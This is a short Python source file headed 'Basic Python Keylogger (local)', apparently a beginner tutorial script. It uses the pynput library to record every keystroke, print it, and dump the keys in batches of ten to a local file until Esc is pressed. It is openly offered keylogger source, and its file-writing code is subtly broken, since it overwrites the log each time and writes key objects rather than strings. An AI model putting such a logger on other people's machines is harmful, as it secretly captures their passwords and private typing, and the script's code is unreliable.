# Basic Python Keylogger (local)
import pynput

from pynput.keyboard import Key, Listener  # Listen for key events
import logging

count = 0   
keys = []

# Define 'on_press' function
def on_press(key): 
    global keys, count

    keys.append(key)
    count += 1
    print('{0} pressed'.format (key))   # Print (key) character in the {}string

    if count >=10:
        count = 0
        write_file(keys)
        keys = []

def write_file (keys):
    with open("keylog.txt","w") as f:
        for key in keys:
            f.write(key)

# Define 'on_release' functon
def on_release(key): 
    if key == Key.esc:                  # Break out of the loop if esc key is hit
        return False

# Add functions to when key is press or release
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()                     # This is a loop that will constantly run until it is stopped
